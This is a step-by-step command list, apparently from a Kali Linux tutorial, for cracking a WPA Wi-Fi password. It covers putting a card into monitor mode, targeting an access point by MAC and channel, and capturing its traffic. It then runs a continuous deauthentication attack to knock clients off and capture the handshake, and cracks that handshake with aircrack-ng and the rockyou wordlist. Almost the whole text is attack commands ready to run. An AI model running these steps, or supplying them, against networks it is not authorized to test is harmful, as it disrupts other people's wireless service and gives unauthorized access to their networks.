================
Commands used:
================

# See version of Kali

```bash
cat /etc/os-release
```

```bash
uname -a
```

# See interfaces

```bash
ip addr
```

```bash
iwconfig
```

# kill processes

```bash
sudo airmon-ng check kill
```

# Start monitor mode

```bash
sudo airmon-ng start wlan0
```

# Verify that monitor mode is used

```bash
sudo airmon-ng
```

# You could also use iwconfig to check that interface is in monitor mode:

```bash
iwconfig
```

#  Get the AP's MAC address and channel

```bash
sudo airodump-ng wlan0mon
```

#  AP-MAC & channel - you need to select your own here:

ESSID: 90:9A:4A:B8:F3:FB
Channel used by AP for SSID: 2

# 1st Window:
# Make sure you replace the channel number and bssid with your own
# Replace hack1 with your file name like capture1 or something

```bash
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
```

# 2nd Window - deauth attack
# Make sure you replace the bssid with your own

```bash
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```

# Use Wireshark to open hack file

```bash
wireshark hack1-01.cap
```

# Filter Wireshark messages for EAPOL

eapol

# Stop monitor mode

```bash
airmon-ng stop wlan0mon
```

# Crack file with Rock you or another wordlist
# Make sure you have rockyou in text format (unzip file on Kali)
# Replace hack1-01.cap with your file name

```bash
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```